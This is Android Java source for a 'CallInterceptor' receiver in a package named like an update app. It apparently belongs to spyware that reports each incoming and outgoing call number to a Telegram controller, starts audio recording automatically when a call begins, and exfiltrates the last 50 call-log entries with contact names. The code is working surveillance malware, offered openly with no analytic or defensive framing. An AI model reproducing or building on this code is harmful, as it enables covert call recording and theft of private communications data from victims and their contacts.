package com.kasari.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallInterceptor extends BroadcastReceiver {

    private static String lastState = TelephonyManager.EXTRA_STATE_IDLE;
    private static String lastNumber = "";
    private static long callStartTime = 0;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
            
            if (incomingNumber != null && !incomingNumber.isEmpty()) {
                lastNumber = incomingNumber;
            }
            
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                lastState = TelephonyManager.EXTRA_STATE_RINGING;
                callStartTime = System.currentTimeMillis();
                TelegramController.sendMessage(context, 
                    "📞 Incoming Call from: " + lastNumber + "\nTime: " + 
                    new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date()));
                
                // Start recording automatically
                VoiceRecorder.startRecording(context, 300);
                
            } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                if (lastState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                    TelegramController.sendMessage(context, 
                        "📞 Call Answered: " + lastNumber);
                } else {
                    callStartTime = System.currentTimeMillis();
                    VoiceRecorder.startRecording(context, 300);
                }
                lastState = TelephonyManager.EXTRA_STATE_OFFHOOK;
                
            } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                if (callStartTime > 0) {
                    long duration = (System.currentTimeMillis() - callStartTime) / 1000;
                    TelegramController.sendMessage(context, 
                        "📞 Call Ended: " + lastNumber + 
                        "\nDuration: " + duration + " seconds");
                    
                    VoiceRecorder.stopRecording(context);
                }
                lastState = TelephonyManager.EXTRA_STATE_IDLE;
                callStartTime = 0;
            }
        }
        
        if (action.equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            String outgoingNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            if (outgoingNumber != null) {
                lastNumber = outgoingNumber;
                callStartTime = System.currentTimeMillis();
                TelegramController.sendMessage(context, 
                    "📞 Outgoing Call to: " + outgoingNumber + "\nTime: " + 
                    new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date()));
                
                VoiceRecorder.startRecording(context, 300);
            }
        }
    }

    public static void sendCallLogs(Context context) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📞 **Call Logs**\n\n");
                
                Cursor cursor = context.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI, null, null, null,
                    CallLog.Calls.DATE + " DESC LIMIT 50");
                
                if (cursor != null) {
                    int count = 0;
                    while (cursor.moveToNext() && count < 50) {
                        String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                        String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                        long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                        long duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
                        
                        String typeStr = "";
                        switch (Integer.parseInt(type)) {
                            case CallLog.Calls.INCOMING_TYPE: typeStr = "Incoming"; break;
                            case CallLog.Calls.OUTGOING_TYPE: typeStr = "Outgoing"; break;
                            case CallLog.Calls.MISSED_TYPE: typeStr = "Missed"; break;
                        }
                        
                        String callerName = (name != null && !name.isEmpty()) ? name : number;
                        String dateStr = new SimpleDateFormat("dd-MM HH:mm", Locale.getDefault()).format(new Date(date));
                        
                        sb.append("📞 ").append(typeStr).append(" | ").append(callerName);
                        sb.append(" | ").append(dateStr).append(" | ").append(duration).append("s\n");
                        
                        count++;
                    }
                    cursor.close();
                }
                
                sb.append("\nTotal: ").append(getCallLogCount(context)).append(" calls");
                TelegramController.sendMessage(context, sb.toString());
                
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private static int getCallLogCount(Context context) {
        Cursor cursor = context.getContentResolver().query(
            CallLog.Calls.CONTENT_URI, null, null, null, null);
        int count = cursor != null ? cursor.getCount() : 0;
        if (cursor != null) cursor.close();
        return count;
    }
}